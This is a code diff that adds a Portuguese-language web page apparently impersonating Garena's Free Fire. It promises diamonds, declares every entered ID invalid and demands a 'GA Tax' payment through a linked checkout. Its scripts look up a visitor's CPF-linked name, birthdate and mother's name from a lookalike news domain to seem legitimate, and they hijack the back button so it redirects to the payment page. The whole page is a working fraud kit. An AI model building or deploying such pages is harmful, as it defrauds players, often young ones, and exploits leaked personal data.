@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <link rel="stylesheet" href="css/style.css">
+    
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #9D0C21;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #9D0C21;
+            cursor: pointer;
+        }
+    </style>
+
+
+    <title>CONFIRMAÇÃO ID</title>
+    
+    
+</head>
+
+<body>
+    <header>
+        <img src="images/LogoRecFF.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio dos diamantes.</p>
+    </header>
+
+    <div class="profile-stats">
+        <div class="stat">
+            <!-- <img id="imagem" src="images/GarenaLogo.png" alt=""> -->
+            <span>ID verificado com sucesso!</span>
+        </div>
+        <p>Confirme seu ID da sua Conta FF:</p>
+    </div>
+    <div class="input-group">
+        <label for="inputID">Insira seu ID do FF:</label>
+        <input type="text" id="inputID" name="inputID" placeholder="Ex: 123456789">
+    </div>
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/LogoGarena02.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seu ID...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ID INVÁLIDO</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+               <p>
+                    O ID cadastrado consta como inválido em nosso banco de dados.
+
+                    <br><br>
+
+                    Para realizarmos o envio dos diamantes é necessário cadastrar o ID novamente, sendo necessário o pagamento da [GA Tax] taxa mínima de cadastro!
+                    
+                    <br><br>
+                    
+                    Obs: O Valor pago da taxa miníma será reembolsada através de 1000 diamantes extras!
+                </p>
+
+               <div style="width: auto; max-width: 400px;;">
+        <a href="../checkout03.html" class="fornpay_btn">PAGAR GA TAX</a>
+    </div>
+     
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/LogosRecs.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença
+            GA/FF 2025©
+        </p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+            
+        // Rastreamento de eventos ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            // Adicionar rastreamento ao botão "CONFIRMAR"
+            const confirmButton = document.getElementById('sends');
+            if (confirmButton) {
+                confirmButton.addEventListener('click', function() {
+                    // Lógica que não seja window.trackEvent pode permanecer aqui
+                });
+            }
+        });
+    </script>
+
+
+<script>
+    var urlBackRedirect = '../checkout03.html'; // lembre-se de usar a url sem espaços
+    // não altere nada abaixo dessa linha
+    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+        setTimeout(function () {
+            location.href = urlBackRedirect;
+        }, 1);
+    };
+</script>
+
+
+</body></html>
